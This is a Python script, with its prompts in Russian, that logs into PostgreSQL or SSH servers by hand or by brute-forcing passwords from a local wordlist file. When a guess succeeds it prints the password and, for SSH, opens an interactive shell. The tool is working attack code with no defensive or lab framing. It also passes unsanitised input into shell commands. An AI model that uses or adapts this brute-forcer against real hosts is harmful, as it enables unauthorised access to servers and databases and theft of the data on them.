import subprocess
import sys
import os
import pexpect

def manual_input_psql():
    host = input("Введите доменное имя или IP-адрес: ")
    port = input("Введите порт (оставьте пустым для порта по умолчанию 5432): ")
    if not port:
        port = "5432"
    username = input("Введите имя пользователя: ")
    database = input("Введите имя базы данных: ")
    password = input("Введите пароль: ")
    
    command = f"psql -h {host} -p {port} -U {username} -d {database}"
    os.environ['PGPASSWORD'] = password
    print(f"Выполняется команда: {command}")
    subprocess.run(command, shell=True)

def bruteforce_psql():
    host = input("Введите доменное имя или IP-адрес: ")
    port = input("Введите порт (оставьте пустым для порта по умолчанию 5432): ")
    if not port:
        port = "5432"
    username = input("Введите имя пользователя: ")
    database = input("Введите имя базы данных: ")
    
    with open("pass.txt", "r") as file:
        passwords = file.readlines()
    
    for password in passwords:
        password = password.strip()
        command = f"psql -h {host} -p {port} -U {username} -d {database}"
        os.environ['PGPASSWORD'] = password
        print(f"Пробуем пароль: {password}")
        
        try:
            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.returncode == 0:
                print(f"Успешный вход! Пароль: {password}")
                return  # Останавливаем брутфорс, если пароль верный
            elif "password authentication failed" in result.stderr:
                print("Неверный пароль, пробуем следующий...")
            else:
                print(f"Ошибка: {result.stderr}")
                break
        except Exception as e:
            print(f"Ошибка при выполнении команды: {e}")
            break

def manual_input_ssh():
    host = input("Введите доменное имя или IP-адрес: ")
    port = input("Введите порт (оставьте пустым для порта по умолчанию 22): ")
    if not port:
        port = "22"
    username = input("Введите имя пользователя: ")
    password = input("Введите пароль: ")
    
    ssh_connect(host, int(port), username, password)

def bruteforce_ssh():
    host = input("Введите доменное имя или IP-адрес: ")
    port = input("Введите порт (оставьте пустым для порта по умолчанию 22): ")
    if not port:
        port = "22"
    username = input("Введите имя пользователя: ")
    
    with open("pass.txt", "r") as file:
        passwords = file.readlines()
    
    for password in passwords:
        password = password.strip()
        print(f"Пробуем пароль: {password}")
        
        try:
            ssh_connect(host, int(port), username, password)
            print(f"Успешный вход! Пароль: {password}")
            return  # Останавливаем брутфорс, если пароль верный
        except pexpect.exceptions.EOF:
            print("Неверный пароль, пробуем следующий...")
        except pexpect.exceptions.TIMEOUT:
            print("Время ожидания истекло, пробуем следующий пароль...")
        except Exception as e:
            print(f"Ошибка при выполнении команды: {e}")
            break

def ssh_connect(hostname, port, username, password):
    ssh_command = f"ssh -p {port} {username}@{hostname}"
    child = pexpect.spawn(ssh_command)
    
    try:
        i = child.expect(['password:', pexpect.EOF, pexpect.TIMEOUT])
        if i == 0:
            child.sendline(password)
            i = child.expect(['$', '#', pexpect.EOF, pexpect.TIMEOUT])
            if i == 0 or i == 1:
                print("Успешное подключение по SSH")
                child.interact()
            else:
                raise pexpect.exceptions.EOF
        else:
            raise pexpect.exceptions.EOF
    except pexpect.exceptions.EOF:
        raise pexpect.exceptions.EOF
    except pexpect.exceptions.TIMEOUT:
        raise pexpect.exceptions.TIMEOUT
    finally:
        child.close()

def main_menu():
    print("1. Подключение к PostgreSQL (psql)")
    print("2. Подключение к SSH")
    choice = input("Выберите опцию (1 или 2): ")
    
    if choice == "1":
        print("1. Ручной ввод данных")
        print("2. Брутфорс пароля")
        sub_choice = input("Выберите опцию (1 или 2): ")
        if sub_choice == "1":
            manual_input_psql()
        elif sub_choice == "2":
            bruteforce_psql()
        else:
            print("Неверный выбор. Пожалуйста, выберите 1 или 2.")
            main_menu()
    elif choice == "2":
        print("1. Ручной ввод данных")
        print("2. Брутфорс пароля")
        sub_choice = input("Выберите опцию (1 или 2): ")
        if sub_choice == "1":
            manual_input_ssh()
        elif sub_choice == "2":
            bruteforce_ssh()
        else:
            print("Неверный выбор. Пожалуйста, выберите 1 или 2.")
            main_menu()
    else:
        print("Неверный выбор. Пожалуйста, выберите 1 или 2.")
        main_menu()

if __name__ == "__main__":
    try:
        import pexpect
    except ImportError:
        print("Ошибка: модуль pexpect не установлен. Пожалуйста, установите его с помощью 'pip install pexpect'.")
        sys.exit(1)
    
    main_menu()
